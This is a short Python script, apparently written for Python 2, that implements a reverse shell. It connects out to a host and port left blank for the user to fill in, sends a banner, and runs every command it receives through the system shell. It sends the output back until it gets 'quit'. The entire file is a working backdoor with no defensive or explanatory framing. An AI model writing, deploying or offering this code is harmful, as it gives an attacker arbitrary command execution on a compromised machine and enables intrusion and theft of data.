#!/usr/bin/python
import socket
import subprocess


HOST = ''  # Host server here
PORT = ''  # Chosen port to listen to

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
s.send('[*] Connection Established!')

while 1:
    data = s.recv(1024)
    if data == 'quit':
        break
    proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    stdout_val = proc.stdout.read() + proc.stderr.read()
    s.send(stdout_val)
s.close()
